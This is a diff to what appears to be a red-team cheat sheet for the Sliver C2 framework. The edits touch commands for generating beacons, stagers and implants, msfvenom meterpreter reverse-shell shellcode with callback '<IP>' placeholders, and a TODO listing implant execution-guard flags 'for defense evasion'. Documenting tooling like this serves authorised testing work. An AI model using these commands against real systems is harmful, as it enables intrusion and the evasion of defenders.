@@ -123,6 +123,18 @@ sliver > generate beacon -m <IP>:<PORT> -S 5 -J 10 -a <[amd64 | x64] | arm | arm
 sliver > generate beacon -m <IP>:<PORT> -S 5 -J 10 -a <[amd64 | x64]> -o solaris -f exe -s /path/to/directory
 ```
 
+TODO: Test these features for defense evasion.
+
+```
+  -X, --key-exchange       int       wg key-exchange port (default: 1337)
+  -w, --limit-datetime     string    limit execution to before datetime
+  -x, --limit-domainjoined           limit execution to domain joined machines
+  -F, --limit-fileexists   string    limit execution to hosts with this file in the filesystem
+  -z, --limit-hostname     string    limit execution to specified hostname
+  -L, --limit-locale       string    limit execution to hosts that match this locale
+  -y, --limit-username     string    limit execution to specified username
+```
+
 ### 4.1.3 - Profiles
 
 #### 4.1.3.1 - Help Menu
@@ -264,9 +276,7 @@ Sub Commands:
 
 ### 4.2.2 - Usage
 
-* Syntax
-
-This beacon will be on interactive (session) mode
+This beacon will be on interactive (session) mode. Here are the following syntax usage.
 
 ```
 sliver > generate -m <IP>:<PORT> -a <architecture> -o <platform> -f <format> -s /path/to/directory
@@ -338,7 +348,7 @@ Sub Commands:
 
 #### 4.2.3.2 - Usage
 
-* Windows
+Windows
 
 ```
 sliver > profiles new -m <IP>:<PORT> -l -a <architecture> -o <platform> -f <format> <profile_name>
@@ -451,9 +461,11 @@ sliver > stage-listener -u tcp://<IP>:8080 -p stager-shellcode
 sliver > generate stager -r tcp -L <IP> -l 8080 -a x64 -o windows -f raw -s staged-sliver.bin
 ```
 
-* Or you can generate it with `msfvenom`
+Or you can generate it with `msfvenom`.
 
-`$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=8080 -f raw -o staged-sliver.bin`
+```
+$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=8080 -f raw -o staged-sliver.bin
+```
 
 #### 4.3.2.3 - HTTP
 
@@ -470,13 +482,15 @@ sliver > stage-listener -u http://<IP>:8080 [-P] -p stager-shellcode
 sliver > generate stager -r http -L <IP> -l 8080 -a x64 -o windows -f raw -s sliver-http-stager.bin
 ```
 
-* Or you can generate it with `msfvenom`
+Or you can generate it with `msfvenom`
 
-`$ msfvenom -p windows/x64/custom/reverse_winhttp lhost=<IP> lport=8080 luri=/shellcode.woff -f raw -o sliver-http-stager.bin`
+```
+$ msfvenom -p windows/x64/custom/reverse_winhttp lhost=<IP> lport=8080 luri=/shellcode.woff -f raw -o sliver-http-stager.bin
+```
 
 #### 4.3.2.4 - HTTPS
 
-1. Use custom TLS key and certificate (this is optional but recommended for OPSEC)
+Use custom TLS key and certificate (this is optional but recommended for OPSEC).
 
 Encrypted TLS key and certification
 
@@ -510,42 +524,37 @@ $ msfvenom -p windows/x64/custom/reverse_winhttps lhost=<IP> lport=8080 luri=/sh
 
 ## 4.4 - Implants
 
-### 4.4.1 - Help Menu
-
-```
-sliver > implants -h
-
-List implant builds
-
-Usage:
-======
-  implants [flags]
-
-Flags:
-======
-  -a, --arch          string    filter builds by cpu architecture
-  -f, --format        string    filter builds by artifact format
-  -h, --help                    display help
-  -d, --no-debug                filter builds by debug flag
-  -b, --only-beacons            filter beacons
-  -s, --only-sessions           filter interactive sessions
-  -o, --os            string    filter builds by operating system
-  -t, --timeout       int       command timeout in seconds (default: 60)
-
-Sub Commands:
-=============
-  rm  Remove implant build
-```
-
-### 4.4.2 - Usage
-
 List the implant names
 
 ```
-sliver > implants
+sliver > implants [-a <i386 | amd64>]
 ```
 
-Remove implants
+List the implants with a format filter.
+
+```
+sliver > implants [-f <format>]
+```
+
+Only list beacon implants.
+
+```
+sliver > implants [-b]
+```
+
+Only list interactive session implants.
+
+```
+sliver > implants [-s]
+```
+
+Only list implants with a specific operating system.
+
+```
+sliver > implants [-o <operating_system>]
+```
+
+Remove implants.
 
 ```
 sliver > implants rm <implant_name>
